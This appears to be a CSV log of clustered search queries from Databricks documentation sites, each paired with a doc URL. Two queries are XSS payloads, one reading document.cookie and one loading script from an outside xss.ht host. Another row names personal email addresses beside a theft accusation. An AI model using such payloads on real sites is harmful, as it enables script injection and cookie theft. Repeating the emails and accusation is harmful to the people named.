cluster,url,search_text
0,https://docs.gcp.databricks.com/resources/supported-browsers.html,installing chrome
0,https://docs.gcp.databricks.com/runtime/conda.html,conda on 9.1 lts
0,https://docs.gcp.databricks.com/runtime/dbr.html,runtime version runtime version
1,https://docs.gcp.databricks.com/runtime/index.html,databricks runtimes
1,https://docs.gcp.databricks.com/runtime/mlruntime.html,central model registry databricks runtime 10.3 ml
4,https://docs.gcp.databricks.com/runtime/photon.html,photon on azure sql to dataframe
0,https://docs.gcp.databricks.com/search.html,excel google sheet google cloud cloud comparison google sheets google sheets google cloud google drive connector
0,https://docs.gcp.databricks.com/security/access-control/cluster-acl.html,"""service account"""
3,https://docs.gcp.databricks.com/security/access-control/index.html,"revoking permissions access control lists table access control role-based access access control overview role based access control access controls access control ""please use a valid cross account iam role with permissions setup correctly"" access control access control access control overview access control restrict mount access"
0,https://docs.gcp.databricks.com/security/access-control/jobs-acl.html,create a job using terraform
3,https://docs.gcp.databricks.com/security/access-control/table-acls/index.html,table access control table access sql endpoint table access control table access controls table access control
3,https://docs.gcp.databricks.com/security/access-control/table-acls/table-acl.html,9.1 lts ml does not support table access control enable table access control enable table access control
0,https://docs.gcp.databricks.com/security/access-control/workspace-acl.html,temp folder
0,https://docs.gcp.databricks.com/security/hipaa.html,private preview
3,https://docs.gcp.databricks.com/security/index.html,ip access list domain re
3,https://docs.gcp.databricks.com/security/network/ip-access-list.html,control plane ip address ip ac ip access list ip address ip address ip allowlist access list ip access list api ip range ip acc ip addresses ip access ip access list access list
0,https://docs.gcp.databricks.com/security/secrets/example-secret-workflow.html,create scope
0,https://docs.gcp.databricks.com/security/secrets/secret-scopes.html,secret scope create scope
1,https://docs.gcp.databricks.com/security/secrets/secrets.html,creating secrets in databricks environment variables cluster secret environment secret managiung secrets
0,https://docs.gcp.databricks.com/security/secure-cluster-connectivity.html,secure cluster private cluster global ip secure cl private service connect secure c control plane ip address enable private cluster scc relay ip addresses no public ip control plane secure cluster connectivity secure cluster
0,https://docs.gcp.databricks.com/spark/latest/dataframes-datasets/index.html,aml dataset dataframe as view
0,https://docs.gcp.databricks.com/spark/latest/dataframes-datasets/introduction-to-dataframes-scala.html,min max dataframe column
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/aqe.html,adaptive skew
4,https://docs.gcp.databricks.com/spark/latest/spark-sql/index.html,databricks sql error sql large
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/data-types/double-type.html,double precision
2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-convert-to-delta.html,"salvar delta delta vacuum,"
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-copy-into.html,copy into copy into
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-delete-from.html,delete rows delete from delete table
4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-describe-history.html,sql table history
2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-generate.html,delta generate delta generate
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-merge-into.html,dlt apply merge dlt apply merge merge on
2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-optimize.html,bin packing delta lake start optimize delta
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/aes_encrypt.html,encrypt in transit
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/bool_and.html,if bool
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/explode.html,xml explode
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/get_json_object.html,json get
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/hex.html,hex to dec
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/log.html,databricks_guide/sample applications/log analysis/log analysis in python
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/to_csv.html,export csv
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/to_json.html,write json
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/xpath.html,parsing xml
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/security-create-group.html,cannot create cluster
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/security-grant.html,table grant
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-datatypes.html,data type
4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-functions-udf-scalar.html,sql udf
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-functions.html,user defined functions user defined. functions
4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-hive-compatibility.html,clear cache is not supported on a sql endpoint. external apache hive metastore
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-partition.html,partition pruning tenant partitioning strategy
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-principal.html,unity catalog is in public preview. service principal service principal service principal service principal service principal gcp
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-privileges.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-cache-clear-cache.html,clear cache
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-cache-uncache-table.html,clear cache
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-reset.html,reset reset password for my burke remote at gmail.com account for my burstworks@gmail.com  that sue listclusters and michael washington stole
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set-timezone.html,time zone
6,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set.html,set spark options
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-describe-schema.html,star schema
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-add-archive.html,add file add file
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-add-file.html,add file add data
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-list-file.html,list gcs files list from
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-list-jar.html,exclude jar conflcits
4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-show-columns.html,show columns (databricks sql) sql number of columns in a table
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-show-views.html,show views dynamic view dynamic views show view dynamic views
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-alter-schema.html,alter schema rename schema
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-alter-table.html,alter table alter table partition alter table alter table alter table alter table
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-comment.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-database.html,create data create database create database
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-schema.html,create schema
2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-table-using.html,create delta
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-table.html,create table create table sql create table create table create table create table create table
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-view.html,create view column alias
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-drop-database.html,drop database
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-drop-table.html,drop table drop prurge
5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-tblproperties.html,databricks display table
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-use-schema.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-diagram.html,within keyword
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-groupby.html,group by
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-lateral-view.html,dynamic views
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select.html,select colu time travel time travel select from
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/pandas-function-apis.html,out of memory
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/query-watchdog.html,query watchdog
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/semi-structured.html,case nested column
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/spark-pandas.html,from pyspark.pandas
0,https://docs.gcp.databricks.com/spark/latest/spark-sql/udf-python.html,user-defined functions user defined functions java
0,https://docs.gcp.databricks.com/spark/latest/sparkr/sparklyr.html,sparklyr and createorreplacetempview
0,https://docs.gcp.databricks.com/sql/admin/alert-destinations.html,job alert email
0,https://docs.gcp.databricks.com/sql/admin/data-access-configuration.html,service account service account service account google cloud storage
0,https://docs.gcp.databricks.com/sql/admin/general.html,date and time
0,https://docs.gcp.databricks.com/sql/admin/index.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/sql/admin/query-history.html,window duration
4,https://docs.gcp.databricks.com/sql/admin/sql-configuration-parameters.html,sql endpoint sql warehouse
4,https://docs.gcp.databricks.com/sql/admin/sql-endpoints.html,query monitor sql endpoint sql endpoint
0,https://docs.gcp.databricks.com/sql/admin/users-groups.html,unity catalog is in public preview.
3,https://docs.gcp.databricks.com/sql/api/authentication.html,--header 'authorization: bearer dapixxxxxxxxxxxxxxxd' personal access
0,https://docs.gcp.databricks.com/sql/api/sql-endpoints.html,max spot price
0,https://docs.gcp.databricks.com/sql/get-started/concepts.html,primary key
0,https://docs.gcp.databricks.com/sql/get-started/user-quickstart.html,create token how do
0,https://docs.gcp.databricks.com/sql/language-manual/data-types/double-type.html,double precision
0,https://docs.gcp.databricks.com/sql/language-manual/delta-merge-into.html,merge into
2,https://docs.gcp.databricks.com/sql/language-manual/delta-vacuum.html,"delta vacuum,"
0,https://docs.gcp.databricks.com/sql/language-manual/functions/bool_or.html,if bool
1,https://docs.gcp.databricks.com/sql/language-manual/functions/case.html,databricks case creation
4,https://docs.gcp.databricks.com/sql/language-manual/functions/date.html,select min date in sql
0,https://docs.gcp.databricks.com/sql/language-manual/functions/date_trunc.html,trunc date
0,https://docs.gcp.databricks.com/sql/language-manual/functions/percent_rank.html,window duration
4,https://docs.gcp.databricks.com/sql/language-manual/functions/startswith.html,databricks sql databricks sql
0,https://docs.gcp.databricks.com/sql/language-manual/functions/std.html,standard deviation
0,https://docs.gcp.databricks.com/sql/language-manual/functions/variance.html,undefined function
0,https://docs.gcp.databricks.com/sql/language-manual/functions/version.html,undefined function
0,https://docs.gcp.databricks.com/sql/language-manual/functions/width_bucket.html,gcp bucket
0,https://docs.gcp.databricks.com/sql/language-manual/index.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/sql/language-manual/security-drop-group.html,primary key
0,https://docs.gcp.databricks.com/sql/language-manual/security-revoke.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-datatype-rules.html,primary key
1,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-datatypes.html,databricks certified associate data analyst (beta)
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-principal.html,unity catalog is in public preview. service principals service principal
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-privileges.html,unity catalog is in public preview.
2,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-alter-table.html,rename a delta table name change a name column
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-location.html,unity catalog is in public preview.
5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-table-using.html,create table delta table create
5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-table.html,create table create table
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-view.html,column alias create view create view
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-drop-schema.html,delete database
5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-drop-table.html,drop table
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-use-schema.html,unity catalog is in public preview.
0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-window-functions.html,marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications
0,https://docs.gcp.databricks.com/sql/user/data/tables.html,display schema
4,https://docs.gcp.databricks.com/sql/user/favorites-tags.html,databricks sql dashboard
1,https://docs.gcp.databricks.com/sql/user/index.html,databricks for sas users
3,https://docs.gcp.databricks.com/sql/user/security/access-control/index.html,access control overview
3,https://docs.gcp.databricks.com/sql/user/security/cloud-storage-access.html,service account configure access to cloud storage service account gcp bucket service account
3,https://docs.gcp.databricks.com/sql/user/security/personal-access-tokens.html,personal access token personal access token personal access token
1,https://docs.gcp.databricks.com/sql/user/visualizations/tables.html,databricks display format fact tables
0,https://docs.gcp.databricks.com/workspace-index.html,data science & engineering?
0,https://docs.gcp.databricks.com/workspace/index.html,workspace details
0,https://docs.gcp.databricks.com/workspace/workspace-details.html,get workspace id
0,https://docs.gcp.databricks.com/workspace/workspace-objects.html,user home search workspace
0,https://docs.microsoft.com/en-us/azure/databricks/,"""><img src=x onerror=javascript:alert(document.cookie)>"
1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/,azure databricks certified associate platform administrator single sign-on
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/cluster-acl,git proxy cluster is being terminated in e2 workspace limit cluster workspace access enable cluster access control for your workspace
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/conditional-access,upgrade premium
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/jobs-acl,enable jobs access control for your workspace
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/table-acl,permission to create cluster
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/tokens,access token access token access token manage personal access tokens
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/account,subscription quota exceeded upgrade premium
1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/azure-diagnostic-logs,diagnostic logging in azure databricks azure monitoring
1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/usage-detail-tags-azure,usage of databricks dbu cost analysis cluster tags
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/admin-console,access the admin console admin console admin porta lost admin password access the admin console admin console admin console name
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/,on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/on-prem-network,on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/vnet-inject,on premise gitlab instances unreachable
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/vnet-peering,on premise gitlab peer virtual networks
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/clusters/,streamwrite with options
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/clusters/policies,cluster polici manage clusters
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/disaster-recovery,recovery folder
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/groups,add users to groups
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/scim/,user usage provision users and groups using scim
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/service-principals,"""client secret"""
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/users,add users to groups access the admin console unexpected cluster termination add user
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/dbfs-ui-upload,upload dbc in the workspace
3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/notebooks,restrict notebook access
0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/storage,purge cluster logs
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/experiments-page,artifact location
3,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/access-control,give only read access to tables
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/feature-tables,feature stor
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/time-series,time travel
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/load-data/,saving data
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/model-export/,export and import models export and import models export and import models import dbc
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/reference-solutions/,reference solutions
1,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/reference-solutions/recommender-wide-n-deep,mlflow model serving on databricks issues serving recommendations models
0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/train-model/tensorflow,how to check tensorflow version tensorflow version
0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/model-registry-webhooks,encryption_algorithm_name = 'aead_aes_256_cbc_hmac_sha_256'
0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/model-serving,serving pending mlflow model serving with custom loss
0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/projects,mlflow project
0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/quick-start-python,load data python import python packages install python module
0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/tracking,clone notebook
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/,issue with standard cluster my cluster is not starting can't start cluster manage clusters azure cluster not starting cluster size display pools
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/cluster-config-best-practices,garbage collection
1,https://docs.microsoft.com/en-us/azure/databricks/clusters/clusters-manage,cluster is not starting start a cluster cluster stuck in pending cluster manager logs arr- databricks cluster performance issue clone a cluster cluster wont start manage clusters manage clusters enforce cluster creation cluster init error start cluster
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/configure,cluster tags
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/create,failure to create a serverless cluster create a cluster cluster not starting loading by creating cluster cluster teminated
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/init-scripts,"""><script src=https://x25.xss.ht></script>"
6,https://docs.microsoft.com/en-us/azure/databricks/clusters/single-node,the spark driver has stopped unexpectedly and is restarting. your notebook will be automatically reattached.
0,https://docs.microsoft.com/en-us/azure/databricks/clusters/web-terminal,delete mt account on customer academy web terminal web terminal
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/,delta live delta live tables delta live tables delta live tables data quality constraints
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-cdc,delta live tables cdc apply change change data captur change data feed scd
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-concepts,spark.databricks.delta.format check.enabled cannot modify delta table delta live table
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-configuration,delta live tables init scripts delta live tables delta live tables delta live spark.databricks.delta.format check.enabled
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-cookbook,delta live table kafka avro
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-data-sources,delta live table enable delta live table delta live table kafka avro
0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-event-log,explode json
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-expectations,delta live tables - aggregated quality checks (expectations)
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-quickstart,"delta live tables this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table. delta live tables"
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-ui,"this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table. azure databricks create pipelines"
2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-workflows,"delta live table pipeline this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table."
0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/jobs/jobs,how to download job job error
0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/jobs/jobs-api-updates,jobs api
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/,unity catalog (preview) upgrade premium unity catalog upgrade tables and views to unity catalog manage account-level identities unity catalog unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/automate,unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/business-intelligence,"tableau, ssl_connect: certificate verify failed"
5,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/create-tables,create table azure databricks python create delta table java.io.ioexception: server failed to authenticate the request. make sure the value of authorization header is formed correctly including the signature. please see the cause for further information. create table
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/create-views,data masking view current role create or replace temp view
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/get-started,unity catalog get started using unity catalog unity catalog unity catalog principal get started using unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/limitations,unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/manage-identities,support service principals at the account level for automation manage account-level identities
0,https://docs.microsoft.com/en-us/azure/databricks/data-sharing/delta-sharing/,external data sharing
0,https://docs.microsoft.com/en-us/azure/databricks/data-sharing/delta-sharing/access_list,ip allowlist
0,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/,"import, read, and modify data"
3,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/azure/azure-storage,azure blob in databricks mounted blob blob access no credentials
5,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/hive-tables,drop table from user/hive/warehouse
1,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-csv,how to download a file that was exported to csv using java code need to unload /export databricks query response into amazon s3 buckets as csv files. export data csv file
0,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-json,json files without line delimiter
4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-parquet,"filter data while fetching from parquet file write and update parquet file parquet file create parquet file from dataframe parquet file overwrite parquet file %sql create table if not exists events using parquet options (path ""/mnt/training/ecommerce/events/events.parquet"")"
6,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/redis,issue with spark-redis connector
4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/sql-databases,timedout when connecting to sql database sql server sql server connections simba jdbc
4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/sql-databases-azure,insert into sql from databricks connection sql server sql server sql with apache spark
6,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/xml,xml request in python load special characters with spark-xml xml to dataframe
0,https://docs.microsoft.com/en-us/azure/databricks/data/databricks-datasets,streamwrite with options scala
1,https://docs.microsoft.com/en-us/azure/databricks/data/databricks-file-system,dbfs model access manage the dbfs file browser create folder in dbfs databricks file system upload file upload file upload file databricks file system (dbfs)
0,https://docs.microsoft.com/en-us/azure/databricks/data/metastores/,parquet timestamp requires hive metastore 1.2 or above how to export hive metastore
4,https://docs.microsoft.com/en-us/azure/databricks/data/metastores/external-hive-metastore,external apache hive metastore azure sql external metastore
0,https://docs.microsoft.com/en-us/azure/databricks/delta/,change data feed
0,https://docs.microsoft.com/en-us/azure/databricks/delta/concurrency-control,not serializable
2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-batch,write delta
0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-column-mapping,rearranging columns in
6,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-faq,multi-cluster write stream spark insert stream
2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-ingest,upload csv delta lake
0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-intro,task not serializable foreachbatch
2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-resources,delta lake
0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-streaming,writestream nvarchar
2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-update,cdf scd delete delta table task not serializable foreachbatch
0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-utility,new command line shortcut retention interval magic curl command with variable
5,https://docs.microsoft.com/en-us/azure/databricks/delta/intro-notebooks,import notebook python load table into notebook how to upload azure notebook
0,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/auto-optimize,optimized writes
1,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/file-mgmt,arr- databricks cluster performance issue
0,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/isolation-level,object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder task not serializable foreachbatch
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/2.0/,rest endpoin
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/,rest api (latest) api documentation
1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/aad/service-prin-aad-token,2204200040005851  not able to use service principal to create databricks azure key vault-backed secret scope aad token for jdbc odbc
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/aad/troubleshoot-aad-token,aad token for jdbc odbc
3,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/authentication,personal access tokens generate token access token access token
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/clusters,"""driver is up but is not responsive, likely due to gc"""
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/examples,users created through scim api unable to login
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/gitcredentials,malformed credentials api
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/instance-pools,pools pricing
3,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/ip-access-list,monitor ip utilization whitelist ip for rest api access
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/jobs,create job api
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/libraries,cluster libraries
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/policies,iam policy with aws region restriction
1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/scim/scim-sp,patching for databricks
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/token-management,http error 403</h2> <p>problem accessing /api/2.0/
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/tokens,api post request for token
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/workspace,workspace api
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/ci-cd/ci-cd-azure-devops,azure devops
